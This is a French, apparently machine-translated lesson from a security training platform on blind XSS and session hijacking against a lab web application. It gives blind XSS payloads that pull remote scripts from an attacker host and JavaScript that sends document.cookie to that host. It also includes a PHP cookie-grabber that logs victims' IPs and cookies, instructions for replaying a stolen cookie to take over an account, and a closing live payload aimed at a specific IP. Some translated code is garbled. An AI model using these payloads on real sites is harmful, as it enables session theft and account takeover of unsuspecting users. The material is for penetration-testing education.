Détournement de session
==================

* * * * *

Les applications Web modernes utilisent des cookies pour maintenir la session d'un utilisateur tout au long des différentes sessions de navigation. Cela permet à l'utilisateur de ne se connecter qu'une seule fois et de maintenir sa session connectée en vie même s'il visite le même site Web à une autre fois ou à une autre date. Cependant, si un utilisateur malveillant obtient les données des cookies du navigateur de la victime, il peut être en mesure d'obtenir un accès connecté à l'utilisateur de la victime sans connaître ses informations d'identification.

Avec la possibilité d'exécuter du code JavaScript sur le navigateur de la victime, nous pourrons peut-être récupérer leurs cookies et les envoyer à notre serveur pour détourner leur session connectée en effectuant une attaque de «session de session» (alias «vol de cookie»).

* * * * *

Détection de Blind XSS
-------------------

Nous commençons généralement des attaques XSS en essayant de découvrir si et où une vulnérabilité XSS existe. Cependant, dans cet exercice, nous traiterons d'une vulnérabilité «Blind XSS». Une vulnérabilité XSS aveugle se produit lorsque la vulnérabilité est déclenchée sur une page à laquelle nous n'avons pas accès.

Les vulnérabilités Blind XSS se produisent généralement avec des formulaires uniquement accessibles par certains utilisateurs (par exemple, les administrateurs). Certains exemples potentiels incluent:

- Formulaires de contact
-   Commentaires
- Détails de l'utilisateur
- Billets de support
- En-tête HTTP utilisateur-agent

Exécutons le test sur l'application Web sur (`/ hijacking`) dans le serveur à la fin de cette section. Nous voyons une page d'enregistrement de l'utilisateur avec plusieurs champs, alors essayons de soumettre un utilisateur de `` test 'pour voir comment le formulaire gère les données:

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form.jpg)

Comme nous pouvons le voir, une fois que nous soumettons le formulaire, nous recevons le message suivant:

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg)

Cela indique que nous ne verrons pas comment nos entrées seront gérées ou à quoi il ressemblera dans le navigateur, car il n'apparaîtra pour l'administrateur que dans un certain panneau d'administration auquel nous n'avons pas accès. Dans les cas normaux (c'est-à-dire non aveugles), nous pouvons tester chaque champ jusqu'à ce que nous obtenions une boîte d'alerte, comme ce que nous avons fait dans tout le module. Cependant, comme nous n'avons pas accès sur le panneau d'administration dans ce cas, "Comment pourrions-nous détecter une vulnérabilité XSS si nous ne pouvons pas voir comment la sortie est gérée?"

Pour ce faire, nous pouvons utiliser la même astuce que nous avons utilisée dans la section précédente, qui consiste à utiliser une charge utile JavaScript qui renvoie une demande HTTP à notre serveur. Si le code JavaScript est exécuté, nous obtiendrons une réponse sur notre machine et nous saurons que la page est en effet vulnérable.

Cependant, cela introduit deux problèmes:

1. «Comment pouvons-nous savoir quel champ spécifique est vulnérable?« Étant donné que l'un des champs peut exécuter notre code, nous ne pouvons pas savoir lequel d'entre eux a fait.
2. «Comment pouvons-nous savoir quelle charge utile XSS à utiliser?« Puisque la page peut être vulnérable, mais la charge utile peut ne pas fonctionner?

* * * * *

Chargement d'un script distant
-----------------------

Dans HTML, nous pouvons écrire du code JavaScript dans les balises `<script>`, mais nous pouvons également inclure un script distant en fournissant son URL, comme suit:

Code: HTML

```
<script src="http://OUR_IP/script.js"></script>
```

Ainsi, nous pouvons l'utiliser pour exécuter un fichier JavaScript distant qui est servi sur notre machine virtuelle. Nous pouvons modifier le nom de script demandé de `script.js` au nom du champ dans lequel nous injectons, de sorte que lorsque nous obtenons la demande dans notre machine virtuelle, nous pouvons identifier le champ de saisie vulnérable qui a exécuté le script, comme suit:

Code: HTML

```
<script src="http://OUR_IP/username"></script>

```

Si nous obtenons une demande de «nom d'utilisateur», nous savons que le champ «Nom d'utilisateur» est vulnérable à XSS, etc. Avec cela, nous pouvons commencer à tester diverses charges utiles XSS qui chargent un script distant et voir lequel d'entre eux nous envoie une demande. Voici quelques exemples que nous pouvons utiliser à partir de [PayloadsallThethings](https://github.com/swisskyrepo/payloadsallthethings/tree/master/xss%20Injection#blind-xss):

Code: HTML
```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Comme nous pouvons le voir, diverses charges utiles commencent par une injection comme `'>`, qui peut fonctionner ou non en fonction de la façon dont nos contributions sont traitées dans le backend. Comme mentionné précédemment dans la section «XSS Discovery», si nous avions accès au code source (c'est-à-dire dans un DOM XSS), il serait possible d'écrire avec précision la charge utile requise pour une injection réussie. C'est pourquoi Blind XSS a un taux de réussite plus élevé avec le type de vulnérabilités DOM XSS.

Avant de commencer à envoyer des charges utiles, nous devons démarrer un auditeur sur notre machine virtuelle, en utilisant `NetCat` ou« Php »comme indiqué dans une section précédente:

```
dsgsec@htb[/htb]$ mkdir /tmp/tmpserver
dsgsec@htb[/htb]$ cd /tmp/tmpserver
dsgsec@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Maintenant, nous pouvons commencer à tester ces charges utiles une par une en utilisant l'un d'eux pour tous les champs d'entrée et en ajoutant le nom du champ après notre IP, comme mentionné précédemment, comme:

Code: HTML

```
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

Astuce: nous remarquerons que l'e-mail doit correspondre à un format de messagerie, même si nous essayons de manipuler les paramètres de demande HTTP, car il semble être validé à la fois sur le front-end et le back-end. Par conséquent, le champ de messagerie n'est pas vulnérable et nous pouvons le tester. De même, nous pouvons ignorer le champ de mot de passe, car les mots de passe sont généralement hachés et ne sont généralement pas affichés dans ClearText. Cela nous aide à réduire le nombre de champs d'entrée potentiellement vulnérables que nous devons tester.

Une fois que nous avons soumis le formulaire, nous attendons quelques secondes et vérifions notre terminal pour voir si quelque chose appelé notre serveur. Si rien n'appelle notre serveur, nous pouvons passer à la charge utile suivante, etc. Une fois que nous recevons un appel à notre serveur, nous devons noter la dernière charge utile XSS que nous avons utilisée comme charge utile de travail et noter le nom du champ de saisie qui a appelé notre serveur comme champ de saisie vulnérable.

«Essayez de tester divers charges utiles de Script XSS à distance avec les champs d'entrée restants, et voyez lequel d'entre eux envoie une demande HTTP pour trouver une charge utile de travail».

* * * * *

Détournement de session
-----------------

Une fois que nous avons trouvé une charge utile XSS fonctionnelle et que nous avons identifié le champ de saisie vulnérable, nous pouvons passer à l'exploitation XSS et effectuer une attaque de détournement de session.

Une attaque de détournement de session est très similaire à l'attaque de phishing que nous avons effectuée dans la section précédente. Il nécessite une charge utile JavaScript pour nous envoyer les données requises et un script PHP hébergé sur notre serveur pour saisir et analyser les données transmises.

Il y a plusieurs charges utiles JavaScript que nous pouvons utiliser pour saisir le cookie de session et nous l'envoyer, comme le montrent [PayloadsallThethings](https://github.com/swisskyrepo/payloadsallthes/tree/master/xss%20Injection#exploit-code-ou-POC):

Code: JavaScript

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

L'utilisation de l'une des deux charges utiles devrait fonctionner pour nous envoyer un cookie, mais nous utiliserons le second, car il ajoute simplement une image à la page, qui peut ne pas être très malveillante, tandis que la première navigue vers notre cookie Grabber PHP Page, qui peut sembler suspecte.

Nous pouvons écrire l'une de ces charges utiles JavaScript sur `script.js`, qui sera également hébergée sur notre machine virtuelle:

Code: JavaScript

```
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Maintenant, nous pouvons modifier l'URL dans la charge utile XSS que nous avons trouvé plus tôt pour utiliser `script.js` (« n'oubliez pas de remplacer notre_IP par votre IP VM dans le script JS et la charge utile XSS »):

Code: HTML

```
<script src = http: //our_ip/script.js> </ script>
```

Avec notre serveur PHP en cours d'exécution, nous pouvons désormais utiliser le code dans le cadre de notre charge utile XSS, l'envoyer dans le champ de saisie vulnérable et nous devons passer un appel à notre serveur avec la valeur cookie. Cependant, s'il y avait beaucoup de cookies, nous ne savons peut-être pas quelle valeur de cookie appartient à quel en-tête de biscuits. Ainsi, nous pouvons écrire un script PHP pour les diviser avec une nouvelle ligne et les écrire dans un fichier. Dans ce cas, même si plusieurs victimes déclenchent l'exploit XSS, nous recevrons tous leurs cookies commandés dans un dossier.

Nous pouvons enregistrer le script PHP suivant sous le nom de `index.php` et redémarrer le serveur PHP:

Code: php

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Maintenant, nous attendons que la victime visite la page vulnérable et affiche notre charge utile XSS. Une fois qu'ils le feront, nous obtiendrons deux demandes sur notre serveur, une pour `script.js`, qui à son tour fera une autre demande avec la valeur cookie:

```
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Comme mentionné précédemment, nous obtenons la valeur des cookies dans le terminal, comme nous pouvons le voir. Cependant, depuis que nous avons préparé un script PHP, nous obtenons également le fichier `cookies.txt` avec un journal propre de cookies:

```
dsgsec @ htb [/ htb] $ Cat cookies.txt
IP de victime: 10.10.10.1 | Cookie: Cookie = F904F93C949D19D870911BF8B05FE7B2
```

Enfin, nous pouvons utiliser ce cookie sur la page «Login.php» pour accéder au compte de la victime. Pour ce faire, une fois que nous naviguons vers `/ hijacking / login.php`, nous pouvons cliquer sur` Shift + F9` dans Firefox pour révéler la barre `` Storage 'dans les outils du développeur. Ensuite, nous pouvons cliquer sur le bouton `+` dans le coin supérieur droit et ajouter notre cookie, où le `Name` est la partie avant` = `et la` valeur 'est la pièce après `=` de notre cookie volé:

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg)

Une fois que nous aurons réglé notre cookie, nous pouvons actualiser la page et nous aurons accès comme victime:

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg)

<script src=http://10.10.14.160:8080/script.js></script>